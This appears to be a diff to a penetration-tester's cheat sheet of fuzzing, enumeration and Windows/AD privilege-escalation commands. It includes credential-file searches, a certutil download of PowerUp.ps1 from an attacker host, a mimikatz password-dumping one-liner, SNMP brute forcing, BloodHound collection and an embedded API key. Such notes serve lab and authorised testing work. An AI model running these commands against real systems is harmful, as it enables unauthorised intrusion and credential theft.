@@ -2,7 +2,6 @@ Directory fuzzing
 1.  ` /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt ` - standard fuzzing list
 2. ` /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt ` - longer list if the first one fails to find anything
 
-
 API fuzzing
 1. ` feroxbuster -u http://example.com/api -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -m GET,POST `
 2. ` feroxbuster -u http://example.com/api/v1 --query apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -m GET,POST `
@@ -26,6 +25,11 @@ SQL Injection
 1. ` snmpwalk `, ` snmpbulkwalk ` - to read the MIB tree, `snmpbulkwalk` is faster
 2. ` snmpbrute.py ` - for brute forcing `SNMP` community strings (don't use `onesixtyone` as that only checks for `SNMP v1`)
 3. `SNMP` config files located at `/etc/snmp/snmp.conf` and `/etc/snmp/snmpd.conf`, may contain credentials
+
+Searching filesystem
+1. ` find /home /var/www /opt /tmp /etc -type f \( -iname "*backup*" -o -iname "*.bak" -o -iname "*.old" -o -iname "*.zip" -o -iname "*.tar*" -o -iname "*.gz" -o -iname "*.sql" -o -iname "*.env" -o -iname "*config*" -o -iname "*pass*" -o -iname "*cred*" \) 2>/dev/null ` - Linux searching common directories for files
+2. ` for %d in (C:\Users C:\inetpub C:\ProgramData) do @dir %d /s /b 2>nul | findstr /i "backup .bak .old .zip .tar .gz .sql .env config pass cred web.config unattended" ` - Windows CMD
+3. ` Get-ChildItem C:\Users,C:\inetpub,C:\ProgramData -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "backup|\.bak$|\.old$|\.zip$|\.tar|\.gz$|\.sql$|\.env$|config|pass|cred|web\.config|unattended" } | Select-Object -ExpandProperty FullName ` - PowerShell
 
 Linux filesystem / privilege escalation enumeration (most of these should be run automatically with `linpeas.sh`)
 1. Check `sudo -l` - even if you do not have the user's password
@@ -57,10 +61,12 @@ Windows privilege escalation stuff
 4. ` certutil -urlcache -split -f http://10.10.14.46/PowerUp.ps1 ` - if IWR doesn't work
 5. ` powershell -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}" ` - to run `PowerUp.ps1` when it is already downloaded
 6. Check for backup files or folders - anything with `.old` or `.bak` is of interest
+7. ` C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_History.txt ` - PowerShell history file path for manual enumeration
 
 Windows AD stuff
 1. https://github.com/cube0x0/cube0x0.github.io/blob/master/_posts/2020-03-3-Pocing-Beyond-DA.md - for privilege escalation using AD groups
 2. `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > log.txt` - single line for `mimikatz` to avoid infinite loop, also `lsadump::cache` and `lsadump::sam`
+3. ` bloodhound-python -u <USER> -p <PASSWORD> -d <DOMAIN> -ns <DC_IP> -c All --zip ` - alternative to `SharpHound` that runs directly on Kali
 
 `cron` enumeration
 1. ` ls -lah /etc/cron* ` - List all `cron` jobs with permissions
